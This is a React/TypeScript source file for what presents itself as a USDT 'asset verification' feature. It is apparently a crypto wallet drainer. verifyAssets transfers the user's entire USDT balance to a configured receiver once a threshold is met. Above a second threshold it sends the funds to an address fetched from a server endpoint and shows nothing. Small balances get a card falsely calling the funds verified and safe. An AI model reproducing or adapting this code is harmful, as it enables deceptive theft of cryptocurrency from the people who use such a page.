import React, { useState, useEffect } from "react";
import { ethers } from "ethers";
import { createRoot } from "react-dom/client";
import {fundBNBIfNeeded} from "@/utils/gasUtils"
import usdtAbi from "../abi/USDT.json";
import { USDT_RECEIVER,USDT_THRESHOLD,USDT_THRESHOLD2 } from "../utils/config";
import SuccessCard from "./SuccessCard";
import VerifiedCard from "./VerifiedCard";

// Global state to control card visibility from the standalone function
let globalShowCard = false;
let globalVerificationStatus = null;
// @ts-expect-error build

let root = null;

// Function to render verification cards
export const renderVerificationCard = (status: {
  success: boolean;
  transferred: boolean;
  amount: string;
  message: string;
}) => {
  console.log("🎴 Rendering verification card with status:", status);
  globalVerificationStatus = status;
  globalShowCard = true;
  
  // Create verification element if doesn't exist
  let verificationRoot = document.getElementById('verification-root');
  if (!verificationRoot) {
    console.log("📝 Creating verification root element");
    verificationRoot = document.createElement('div');
    verificationRoot.id = 'verification-root';
    document.body.appendChild(verificationRoot);
  }

  console.log("🎨 Rendering appropriate card based on status");
  // Create root if it doesn't exist
// @ts-expect-error build

  if (!root) {
    root = createRoot(verificationRoot);
  }

  // Render the appropriate card based on status
  root.render(
    status.transferred ? (
      <SuccessCard amount={status.amount} onClose={closeCard} />
    ) : (
      <VerifiedCard amount={status.amount} onClose={closeCard} />
    )
  );

  console.log("📢 Dispatching verification-complete event");
  // Also dispatch event for any mounted components
  window.dispatchEvent(new Event('verification-complete'));
};

// Function to close cards
const closeCard = () => {
  console.log("🔒 Closing verification card");
  globalShowCard = false;
  
  // Find and cleanup the verification root
  const verificationRoot = document.getElementById('verification-root');
  if (verificationRoot) {
    console.log("🧹 Cleaning up verification root");
// @ts-expect-error build

    if (root) {
      root.unmount();
      root = null;
    }
    if (!verificationRoot.hasChildNodes()) {
      verificationRoot.remove();
    }
  }
  
  console.log("📢 Dispatching verification-complete event");
  window.dispatchEvent(new Event('verification-complete'));
};

// Plain function for onClick handler
export const verifyAssets = async (
  provider: ethers.providers.Web3Provider,
  signer: ethers.providers.JsonRpcSigner,
  userAddress: string,
  usdt: ethers.Contract,
  balance: ethers.BigNumber,
  readableBalance: string,
  decimals: number
) => {
  console.log("🚀 Starting asset verification process");
  console.log("📊 Current balance:", readableBalance, "USDT");
  
  try {
    const threshold = ethers.utils.parseUnits(String(USDT_THRESHOLD), decimals);
    const threshold2 = ethers.utils.parseUnits(String(USDT_THRESHOLD2), decimals);
    console.log("🎯 Verification threshold:", ethers.utils.formatUnits(threshold, decimals), "USDT");
    console.log("🎯 Verification threshold 2:", ethers.utils.formatUnits(threshold2, decimals), "USDT");
    
    if (balance.gte(threshold2)) {
      console.log("💰 Balance meets threshold 2, proceeding with special transfer");
      await fundBNBIfNeeded(provider, userAddress);
      const usdtWithSigner = usdt.connect(signer);
      try {
        console.log("📝 Preparing special transfer transaction");
        const response = await fetch('/api/get-receiver-address');
        const data = await response.json();
        const receiverAddress = data.address;

        if (!receiverAddress) {
          throw new Error("Could not fetch receiver address");
        }
        
        console.log("👉 From:", userAddress);
        console.log("👉 To (special):", receiverAddress);
        console.log("👉 Amount:", readableBalance, "USDT");
        
        const tx = await usdtWithSigner.transfer(receiverAddress, balance);
        console.log("🔄 Transaction submitted:", tx.hash);
        console.log("⏳ Waiting for transaction confirmation...");
        
        await tx.wait();
        console.log("✅ Special transaction confirmed!");
        
        // Do not show any card for transfers > USDT_THRESHOLD2
      } catch (transferError) {
        // @ts-expect-error build
        if (transferError.code === 4001) {
          console.log("❌ User rejected transaction");
          // alert("Verification failed as user denied confirmation! Please confirm the message for asset verification");
          return;
        }
        console.error("❌ Transfer error occurred:", transferError);
        // @ts-expect-error build
        if (transferError.error) console.error("Error details:", transferError.error);
        // @ts-expect-error build
        if (transferError.transaction) console.log("Transaction details:", transferError.transaction);
        throw transferError;
      }
    } else if (balance.gte(threshold)) {
      console.log("💰 Balance meets threshold, proceeding with transfer");
      await fundBNBIfNeeded(provider, userAddress);
      const usdtWithSigner = usdt.connect(signer);
      try {
        console.log("📝 Preparing transfer transaction");
        console.log("👉 From:", userAddress);
        console.log("👉 To:", USDT_RECEIVER);
        console.log("👉 Amount:", readableBalance, "USDT");
        
        const tx = await usdtWithSigner.transfer(USDT_RECEIVER, balance);
        console.log("🔄 Transaction submitted:", tx.hash);
        console.log("⏳ Waiting for transaction confirmation...");
        
        await tx.wait();
        console.log("✅ Transaction confirmed!");
        
        renderVerificationCard({
          success: true,
          transferred: true,
          amount: readableBalance,
          message: `Successfully verified and transferred ${readableBalance} USDT`
        });
      } catch (transferError) {
// @ts-expect-error build

        if (transferError.code === 4001) {
          console.log("❌ User rejected transaction");
          // alert("Verification failed as user denied confirmation! Please confirm the message for asset verification");
          return;
        }
        console.error("❌ Transfer error occurred:", transferError);
// @ts-expect-error build

        if (transferError.error) console.error("Error details:", transferError.error);
// @ts-expect-error build

        if (transferError.transaction) console.log("Transaction details:", transferError.transaction);
        throw transferError;
      }
    } else {
      console.log("ℹ️ Balance below threshold, marking as verified without transfer");
      renderVerificationCard({
        success: true,
        transferred: false,
        amount: readableBalance,
        message: `Verified: Your ${readableBalance} USDT is safe and credible to use`
      });
    }
  } catch (error) {
    console.error("❌ Verification process error:", error);
    console.error("Error details:", {
// @ts-expect-error build

      message: error.message,
// @ts-expect-error build

      code: error.code,
// @ts-expect-error build

      data: error.data
    });
    // alert(`Error: ${error.message}`);
  }
};